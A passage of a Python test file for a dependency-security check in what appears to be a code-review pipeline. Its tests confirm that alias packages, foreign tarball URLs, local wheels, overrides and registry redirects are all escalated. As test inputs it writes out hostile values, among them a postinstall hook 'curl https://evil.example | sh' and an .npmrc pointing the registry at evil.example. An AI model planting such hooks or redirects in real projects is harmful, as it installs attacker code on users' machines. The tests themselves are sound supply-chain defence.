                                   '    "node_modules/@scope/util": {\n'
                                   '      "version": "2.0.0",\n'
                                   '      "resolved": "https://registry.'
                                   'npmjs.org/@scope/util/-/util-2.0.0.tgz"'
                                   '\n    }\n  }\n}\n'},
        task=_l0_task([declared_dependency("left-pad", "npm")]),
        stub=StubGetJson({**answers,
                          ("npm", "left-pad"): npm_doc("left-pad"),
                          ("npm", "@scope/util"): npm_doc("@scope/util")}),
    )
    assert "new_dependency" not in report.escalations
    assert {c["name"] for c in report.dependency_checks} == {
        "left-pad", "@scope/util"}

    # (p) R1-1: a dependency VALUE that is not a registry range
    # installs code the registry checks never see — every shape
    # escalates (npm alias, git URL, file:, workspace:, portal:, a
    # user/repo shorthand, a local tarball path), the shape named.
    def _pkg_json(value: str) -> str:
        return ('{\n  "name": "web",\n  "dependencies": {\n'
                f'    "lodash": "{value}"\n  }}\n}}\n')

    bad_values = [
        "npm:evil-pkg@1.0.0", "git+https://evil.example/lodash.git",
        "file:../vendor/lodash", "workspace:*", "portal:./x",
        "lodash/lodash", "./vendor/lodash-4.17.21.tgz",
    ]
    for index, value in enumerate(bad_values):
        report = _l0(
            tmp_path / f"p{index}",
            base={"package.json": _pkg_json("4.17.21")},
            head={"package.json": _pkg_json(value)},
            task=_l0_task([declared_dependency("lodash", "npm")]),
            stub=StubGetJson(answers),
        )
        assert "new_dependency" in report.escalations, value
        assert any("not a registry version range" in (c.get("reason") or "")
                   for c in _fails(report)), value

    # (q) R1-1 lock policing: a link: entry and a foreign `resolved`
    # host each escalate; a changed resolved/integrity at the SAME
    # version counts as added (the registry check runs on it); and a
    # nested node_modules bump is its own pin (never last-wins).
    def _lock(packages: dict) -> str:
        return json.dumps({"lockfileVersion": 3, "packages": packages})

    report = _l0(
        tmp_path / "q1",
        base={"package-lock.json": _lock({"": {}})},
        head={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21", "link": True}})},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "new_dependency" in report.escalations
    assert any("link (workspace link)" in (c.get("reason") or "")
               for c in _fails(report))
    report = _l0(
        tmp_path / "q2",
        base={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://registry.npmjs.org/lodash/-/"
                        "lodash-4.17.21.tgz",
            "integrity": "sha512-aaa"}})},
        head={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://evil.example/lodash.tgz",
            "integrity": "sha512-aaa"}})},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "new_dependency" in report.escalations
    assert any("canonical tarball" in (c.get("reason") or "")
               for c in _fails(report))
    # same version, integrity rotated: an added pin, registry-checked
    # (the stub fails lodash here so the arm is observable).
    report = _l0(
        tmp_path / "q3",
        base={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://registry.npmjs.org/lodash/-/"
                        "lodash-4.17.21.tgz",
            "integrity": "sha512-aaa"}})},
        head={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://registry.npmjs.org/lodash/-/"
                        "lodash-4.17.21.tgz",
            "integrity": "sha512-bbb"}})},
        task=_l0_task(),
        stub=StubGetJson(answers, fail={("npm", "lodash"): "down"}))
    assert "new_dependency" in report.escalations
    assert any(c.get("name") == "lodash" for c in _fails(report))
    # a nested bump is its own pin: the root entry unchanged, the
    # nested one bumped — lodash is added and checked.
    def _pin(version: str) -> dict:
        return {"version": version,
                "resolved": f"https://registry.npmjs.org/lodash/-/"
                            f"lodash-{version}.tgz",
                "integrity": "sha512-A"}

    report = _l0(
        tmp_path / "q4",
        base={"package-lock.json": _lock({
            "": {},
            "node_modules/lodash": _pin("4.17.21"),
            "node_modules/foo/node_modules/lodash": _pin("4.17.15")})},
        head={"package-lock.json": _lock({
            "": {},
            "node_modules/lodash": _pin("4.17.21"),
            "node_modules/foo/node_modules/lodash": _pin("4.17.21")})},
        task=_l0_task(),
        stub=StubGetJson(answers, fail={("npm", "lodash"): "down"}))
    assert "new_dependency" in report.escalations
    assert any(c.get("name") == "lodash" for c in _fails(report))

    # (r) R1-1 pypi: a PEP 508 direct reference (name @ local wheel/URL)
    # escalates in the direct file and in the lock alike.
    for tag, path in (("r1", "requirements.txt"), ("r2", "requirements.lock")):
        report = _l0(
            tmp_path / tag,
            base={path: f"{safe}==1.0\n"},
            head={path: f"{safe}==1.0\npypdf @ ./vendor/pypdf-evil.whl\n"},
            task=_l0_task([declared_dependency("pypdf")]),
            stub=StubGetJson(answers))
        assert "new_dependency" in report.escalations, path
        assert any("direct reference refused" in (c.get("reason") or "")
                   for c in _fails(report)), path

    # (r2a-r2d) R2-1: a lock entry's `resolved` must be EXACTLY the
    # canonical tarball for its own (name, version) — a same-host URL
    # for another package's tarball is npm's own alias shape — and the
    # entry's `name` field must agree with its path.
    def _entry(version, resolved, integrity="sha512-A", **extra):
        return {"version": version, "resolved": resolved,
                "integrity": integrity, **extra}

    good_lodash = "https://registry.npmjs.org/lodash/-/lodash-4.17.22.tgz"
    evil_tarball = ("https://registry.npmjs.org/evil-pkg/-/"
                    "evil-pkg-4.17.22.tgz")
    r2_cases = [
        ("a", "cross-package tarball",
         _entry("4.17.22", evil_tarball, name="evil-pkg")),
        ("b", "version mismatch in the URL",
         _entry("4.17.22", "https://registry.npmjs.org/lodash/-/"
                           "lodash-4.17.20.tgz")),
        ("d", "alias name field on a canonical URL",
         _entry("4.17.22", good_lodash, name="evil-pkg")),
    ]
    for tag, label, entry in r2_cases:
        report = _l0(
            tmp_path / f"r2{tag}",
            base={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
                "version": "4.17.21",
                "resolved": "https://registry.npmjs.org/lodash/-/"
                            "lodash-4.17.21.tgz",
                "integrity": "sha512-A"}})},
            head={"package-lock.json": _lock(
                {"": {}, "node_modules/lodash": entry})},
            task=_l0_task(), stub=StubGetJson(answers))
        assert "new_dependency" in report.escalations, label
        assert any("canonical tarball" in (c.get("reason") or "")
                   or "names itself" in (c.get("reason") or "")
                   for c in _fails(report)), label
    # a scoped package in the RIGHT shape passes (checked by name).
    report = _l0(
        tmp_path / "r2c",
        base={"package-lock.json": _lock({"": {}})},
        head={"package-lock.json": _lock({
            "": {},
            "node_modules/@scope/util": {
                "version": "2.0.0",
                "resolved": "https://registry.npmjs.org/@scope/util/-/"
                            "util-2.0.0.tgz"}})},
        task=_l0_task(),
        stub=StubGetJson({**answers,
                          ("npm", "@scope/util"): npm_doc("@scope/util")}))
    assert "new_dependency" not in report.escalations

    # (r2e/r2f) R2-2: a changed or added non-link entry without
    # `resolved` refuses (npm fetches from whatever registry the
    # environment configures); an inBundle entry is exempt — bundled
    # code ships inside its parent's tarball, itself checked.
    report = _l0(
        tmp_path / "r2e",
        base={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.21",
            "resolved": "https://registry.npmjs.org/lodash/-/"
                        "lodash-4.17.21.tgz"}})},
        head={"package-lock.json": _lock({"": {}, "node_modules/lodash": {
            "version": "4.17.22", "integrity": "sha512-X"}})},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "new_dependency" in report.escalations
    assert any("no 'resolved'" in (c.get("reason") or "")
               for c in _fails(report))
    report = _l0(
        tmp_path / "r2f",
        base={"package-lock.json": _lock({"": {}})},
        head={"package-lock.json": _lock({
            "": {},
            "node_modules/lodash": {"version": "4.17.21",
                                    "inBundle": True}})},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "new_dependency" not in report.escalations
    assert any(c.get("name") == "lodash" and c["verdict"] == "pass"
               for c in report.dependency_checks)

    # (r2g-r2j) R2-3: package.json outside the four maps — overrides,
    # resolutions and any unknown key escalate; inert-only metadata
    # (scripts) still passes.
    for tag, extra in (
            ("g", {"overrides": {"lodash": "npm:evil-pkg@1.0.0"}}),
            ("h", {"resolutions": {"lodash": "1.0.0"}}),
            ("i", {"postinstall": "curl https://evil.example | sh"})):
        report = _l0(
            tmp_path / f"r2{tag}",
            base={"package.json": json.dumps(
                {"name": "web", "dependencies": {}})},
            head={"package.json": json.dumps(
                {"name": "web", "dependencies": {}, **extra})},
            task=_l0_task(), stub=StubGetJson(answers))
        assert "new_dependency" in report.escalations, tag
        assert any("outside the four dependency maps" in (c.get("reason") or "")
                   for c in _fails(report)), tag
    report = _l0(
        tmp_path / "r2j",
        base={"package.json": json.dumps(
            {"name": "web", "dependencies": {},
             "scripts": {"test": "node --test"}})},
        head={"package.json": json.dumps(
            {"name": "web", "dependencies": {},
             "scripts": {"test": "node --test", "lint": "eslint ."}})},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "new_dependency" not in report.escalations

    # (r2k) R2-4: registry-redirecting config files are protected by the
    # SCHEMA-LEVEL default control — an .npmrc in the diff is a
    # protected-path finding on the default profile (no entry of its
    # own), whatever the project.
    report = _l0(
        tmp_path / "r2k",
        base={"src/a.py": "x = 0\n", "package.json": json.dumps(
            {"name": "web", "dependencies": {}})},
        head={"src/a.py": "x = 1\n", "package.json": json.dumps(
            {"name": "web", "dependencies": {}}),
            ".npmrc": "registry=https://evil.example/\n"},
        task=_l0_task(), stub=StubGetJson(answers))
    assert "protected_path_touched" in report.escalations
    assert any(f.id == "protected_path_touched" and f.file == ".npmrc"
               for f in report.findings)

    # (s) R1-2: the registry body bound is MEASURED — a document above
    # the old 1 MiB (real npm docs run to 31.5 MB) passes, one above
    # the 40 MiB cap fails, through the REAL read path with urlopen
    # faked (no network either way).
    import factory.registry as registry_module

    big_ok = dict(pypi_doc(safe))
    big_ok["_filler"] = "x" * (5 * 1024 * 1024)
    big_bad = dict(pypi_doc(safe))
    big_bad["_filler"] = "x" * (41 * 1024 * 1024)

    class _FakeResponse:
        def __init__(self, body: bytes):
            self._body = body
            self._at = 0

        def read(self, n=-1):
            if self._at >= len(self._body):
                return b""
            chunk = self._body[self._at:self._at + max(n, 1)]
            self._at += len(chunk)
            return chunk

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

    real_fetch = registry_module._http_get_json_real
    monkeypatch.setattr(registry_module, "_http_get_json", real_fetch)
    for tag, doc, expect_ok in (("s1", big_ok, True), ("s2", big_bad, False)):
        body = json.dumps(doc).encode("utf-8")
        monkeypatch.setattr(
            registry_module.urllib.request, "urlopen",
            lambda *_a, _body=body, **_k: _FakeResponse(_body))
        client = registry_module.RegistryClient()
        entry = client.check("pypi", safe, version="1.0", declared=True)
        assert (entry["verdict"] == "pass") is expect_ok, tag

    # (t) R1-4a: a registry that answers for ANOTHER package fails the
    # check (the echoed name must match), the reason naming it.
    report = _l0(
        tmp_path / "t",
        base={"requirements.txt": ""},
        head={"requirements.txt": f"{safe}>=1.0\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson(answers, fail={("pypi", safe): "wrong-name"}))
    assert "new_dependency" in report.escalations
    assert any("answered for" in (c.get("reason") or "")
               for c in _fails(report))

    # (u) R1-4b: a REMOVED direct dependency escalates (the contract's
    # dependencies declare additions, never removals).
    report = _l0(
        tmp_path / "u",
        base={"requirements.txt": f"{safe}==1.0\nstarlette==0.27.0\n"},
        head={"requirements.txt": f"{safe}==1.0\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson(answers))
    assert "new_dependency" in report.escalations
    assert any("removed" in (c.get("reason") or "") for c in _fails(report))

    # (w) R1-6: a manifest file ADDED by the diff parses against an
    # empty base side — every entry is judged as an addition, so a
    # fully declared new requirements file passes.
    report = _l0(
        tmp_path / "w",
        base={"requirements.txt": ""},
        head={"requirements.txt": "",
              "requirements-extra.txt": "pypdf==5.4.0\n"},
        task=_l0_task([declared_dependency("pypdf")]),
        profile={**L0_PROFILE_BASE,
                 "dependency_manifests": ["requirements*.txt"]},
        stub=StubGetJson(answers))
    assert "new_dependency" not in report.escalations
    assert any(c.get("name") == "pypdf" and c["verdict"] == "pass"
               for c in report.dependency_checks)

    # (y) R1-2: the per-run registry-call CAP — a diff adding more
    # distinct packages than the cap fails closed on the overflow (the
    # calls are sequential and timeout-bounded; a whole-lock regen must
    # not hold L0 for minutes), the count and the cap named.
    from factory.deps import MAX_REGISTRY_CALLS

    flood_answers = {
        ("pypi", f"pkg{i}"): pypi_doc(f"pkg{i}")
        for i in range(MAX_REGISTRY_CALLS + 1)
    }
    lines = "".join(f"pkg{i}==1.0\n" for i in range(MAX_REGISTRY_CALLS + 1))
    report = _l0(
        tmp_path / "y",
        base={"requirements.txt": ""},
        head={"requirements.txt": lines},
        task=_l0_task([declared_dependency(f"pkg{i}")
                       for i in range(MAX_REGISTRY_CALLS + 1)]),
        stub=StubGetJson(flood_answers))
    assert "new_dependency" in report.escalations
    assert any("registry-call cap" in (c.get("reason") or "")
               for c in _fails(report))
    passes = [c for c in report.dependency_checks if c.get("verdict") == "pass"]
    assert len(passes) == MAX_REGISTRY_CALLS

    # (x) R1-8: a malformed registry document (``info`` not an object)
    # fails the check — never a crash in L0.
    entry = registry_module.RegistryClient(get_json=StubGetJson({
        ("pypi", "pypdf"): {"info": ["not", "an", "object"],
                            "releases": {}}})).check(
        "pypi", "pypdf", version="1.0", declared=True)
    assert entry["verdict"] == "fail"

    # (v) R1-5: a missing or empty top-package list fails the check —
    # never a silently-disabled near-miss rule. The real loader raises
    # for both shapes (probed against a scratch dir); the raise lands
    # in the check as a fail verdict naming the list.
    empty_dir = tmp_path / "v" / "no-lists"
    empty_dir.mkdir(parents=True)
    monkeypatch.setattr(registry_module, "TOP_PACKAGES_DIR", empty_dir)
    registry_module.load_top_packages.cache_clear()
    with pytest.raises(registry_module.RegistryError, match="top-package"):
        registry_module.load_top_packages("pypi")
    populated = tmp_path / "v" / "lists"
    populated.mkdir(parents=True)
    (populated / "pypi.txt").write_text("# only a header\n", encoding="utf-8")
    monkeypatch.setattr(registry_module, "TOP_PACKAGES_DIR", populated)
    registry_module.load_top_packages.cache_clear()
    with pytest.raises(registry_module.RegistryError, match="is empty"):
        registry_module.load_top_packages("pypi")

    def _raising_load(eco):
        raise registry_module.RegistryError(
            "the shipped pypi top-package list (/missing) cannot be read "
            "— the near-miss check refuses to run blind")

    monkeypatch.setattr(registry_module, "load_top_packages", _raising_load)
    entry = registry_module.RegistryClient(
        get_json=StubGetJson(answers)).check(
        "pypi", safe, version="1.0", declared=True)
    assert entry["verdict"] == "fail"
    assert "top-package list" in entry["reason"]

    # (n) approval shows the declared dependencies, --yes is refused
    # for a contract that declares any, and the list rides
    # contract_hash (widening it is a new contract).
    from factory.contract import contract_hash
    repo = build_repo(tmp_path / "n" / "repo")
    task = prespend_task("WO-9", dependencies=[declared_dependency("pypdf")])
    assert contract_hash(task) != contract_hash(
        prespend_task("WO-9", dependencies=[
            declared_dependency("pypdf"), declared_dependency("left-pad", "npm")]))
    queue_path = write_queue(tmp_path / "n", [task], repo=repo)
    echo = Echo()
    status = approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                          confirm=say_yes, echo=echo,
                          factory_root=tmp_path / "n" / "root")
    assert status in ("ready", "blocked")
    assert any("pypdf" in ln for ln in echo.lines), echo.text
    queue_path = write_queue(tmp_path / "n2", [task], repo=repo)
    with pytest.raises(ApprovalError, match="dependencies"):
        approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                     assume_yes=True, echo=lambda _t: None,
                     factory_root=tmp_path / "n2" / "root")
